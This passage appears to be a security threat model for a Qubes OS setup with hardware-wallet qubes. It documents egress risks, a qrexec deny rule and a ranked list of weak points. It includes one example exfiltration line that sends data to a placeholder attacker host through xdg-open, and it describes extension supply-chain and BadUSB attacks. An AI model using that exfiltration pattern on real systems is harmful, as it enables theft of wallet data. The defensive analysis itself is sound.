    - There is no automated signal to the operator that "this isn't my real wallet" — the device tree shows the right name. Treat any unfamiliar physical device the same as an unfamiliar repo: confirm provenance before attaching, and prefer attaching the wallet only when actively using it rather than leaving it persistently bound to `A-wallet-*`.
- **Trezor-specific note — no vendor host software ⚠️:** The `trezor` component installs **only** the udev rules. Trezor Suite, Trezor Bridge and `trezorctl` are deliberately not installed; the default `wallet-trezor` qube spec (`trezor brave-extension-rabby`) leaves the in-browser Rabby extension (via WebUSB / WebHID) as the **sole** code path that can speak the Trezor protocol in that qube. Two operational consequences the operator must internalise:
    - **No out-of-browser cross-check.** A user who would normally open Trezor Suite "just to see the same transaction independently" has no second pane of glass here. A compromised Rabby update therefore has no in-qube tool to be cross-checked against — the on-device confirmation screen is the *only* place the operator can read the transaction details from a non-Rabby source. Treat that screen as load-bearing, not as a formality.
    - **Firmware updates and recovery flows live elsewhere.** Trezor firmware updates, recovery-seed checks, and any Suite-only diagnostic require either installing Suite into this qube (not done by SEQS — adds package surface) or attaching the device to a separate trusted machine for those operations. The qube as shipped is a *signing* qube, not a *management* qube.

  If you want a vendor-side host stack despite the surface tradeoff, install `trezor-suite` (AppImage from the vendor — verify against the [Trezor signing key](https://trezor.io/learn/a/check-trezor-suite-signatures)) in the template, or factor a separate `wallet-trezor-suite` qube. The Ledger entry above already pays this cost via the `ledger` component's app-vm phase (`LedgerLive.AppImage`); the Trezor entry deliberately does not, and the asymmetry is worth knowing.

### Wallet qube egress is unrestricted ⚠️
- **Component:** the default `WALLET_QUBES` (currently `wallet-ledger` and `wallet-trezor`) inherit dom0's default `netvm` (`sys-firewall`) with no `qvm-firewall` allow-list — i.e. these qubes can reach **any** internet host. Same for any future wallet qube added via `WALLET_QUBES`.
- **Trust assumption:** Every piece of code that ever runs in the wallet qube — Brave, the force-installed wallet extensions, Ledger Live, anything the operator later installs — is honest about *which* hosts it contacts.
- **Established by:** Nothing automated. Qubes' per-qube firewall is left at its default allow-all rule set; SEQS does not impose a destination allow-list because the right one (which RPC endpoints? which block explorers? which dApp domains?) is operator-specific.
- **Residual risk:** This is the silent half of the wallet-qube threat model. A wallet-extension supply-chain compromise (see "Brave wallet extensions ⚠️" in §3) — or a hostile Ledger Live AppImage (see "Ledger Live ❌" in §3) — lands in a qube whose only network rule is "anything outbound, anywhere." Concretely, a hostile Rabby / MetaMask / etc. update can:
    - exfiltrate state the extension has access to (open dApps, populated form fields, wallet addresses, browsing context) to a host of its choosing, without prompting;
    - silently substitute the RPC endpoint or block-explorer URL so the operator sees fabricated balance / quote / gas data while signing requests are routed via a hostile relay;
    - frame social-engineering prompts ("approve this Permit2") that look identical to the legitimate UX because they *are* the legitimate UX, just pointed at an attacker-controlled backend.

  The hardware wallet still enforces *its* on-device confirmation, so the spoofer cannot forge a signed transaction — but the **contents** the operator is asked to confirm come from the host stack, and the host stack has unrestricted egress. Wallet-extension supply-chain incidents (Ledger Connect Kit 2023; the npm chalk/debug compromise in 2024-2025) are recurring; the assumption that "the extension will not phone home maliciously" is empirically not safe.

  Deferred — accepted as a default because RPC endpoint sets are operator-specific. The recommended hardening when you know your endpoints is a per-qube `qvm-firewall` default-deny + explicit allow-list, written from dom0 against the live IP set (typical: your RPC provider's hostnames, `clients2.google.com` for extension auto-update if you keep that channel, and any block-explorer you actually use). The cost is breakage every time an endpoint rotates; the benefit is that the extension no longer faces an open door if it ever turns.

  **One layer is no longer deferred:** the default `WALLET_QUBES` specs now carry the `no-handoff` flag, which writes a dom0 qrexec deny rule (28-browser-suppress.policy) for `qubes.OpenURL` from each wallet qube to any target AND skips wiring the per-qube xdg `xdg-open → A-brave` handler. Without this, a compromised wallet extension could ferry data out via `xdg-open https://attacker/?DATA` routed through the open handoff policy — bypassing any `qvm-firewall` lockdown the operator later adds (qvm-firewall does not gate qrexec). The handoff back-channel is now closed by default for wallet qubes; the qvm-firewall lockdown above remains the operator's job for the rest of the egress surface.

---

## Weakest links, ranked

1. **USB-keyboard policy override** (§4) — weakens the Qubes 4.3 default `deny` on `qubes.InputKeyboard sys-usb → dom0` to `ask default_target=@adminvm`. A BadUSB-class device that enumerates as a HID keyboard yields keystroke injection into dom0 = total compromise if the operator reflexively accepts the attach prompt. Accepted in exchange for external USB keyboards working without per-boot `qvm-input-keyboard` ceremony.
2. **Ledger Live** (§3) — Ledger publishes no verifiable artifact for the Linux AppImage and the URL is unversioned, so it can be neither signature-verified nor version-pinned at install time. The post-install replaceability hole is now closed (root-owned `/usr/bin/LedgerLive.AppImage`), but the one-shot install-time trust remains the residual.
3. **curl-pipe-bash installers** (§3) — the `python` (pyenv), `node` (nvm) and `claude-code` components execute unreviewed remote code on install. For pyenv and nvm this is a deliberate tradeoff for dev-version flexibility; see their entries.
4. **`REPO_VM` + cat hack** (§2) — the repo and its host qube are dom0-equivalent in effect; protected only by manual review. Bootstrap stderr is now suppressed at the README's one-liner so a hostile `REPO_VM` cannot emit terminal escapes during the fetch; the underlying "REPO_VM = dom0" envelope is unchanged.

Brave, KeePassXC, Signal, Docker, VS Code, BitBoxApp, Apache OpenOffice and Element (§3) verify their signing keys/signatures against pinned, cross-checked fingerprints, and the keyrings are then `chattr +i`'d so a maintainer-script rewrite of the trust anchor inside an allowlisted package would fail loudly instead of silently rotating; only Ledger Live remains unverifiable.

The browser-link handoff back-channel that previously undermined every `offline` qube and the wallet qubes is now closed by default: `setupBrowserSuppressionPolicy` writes a dom0 deny for `qubes.OpenURL` from every qube spec carrying `offline` or `no-handoff`, and the per-qube xdg launcher is skipped for those qubes. `offline` implies `no-handoff`. The default `WALLET_QUBES` carry `no-handoff` and the keepass qube carries `offline`.
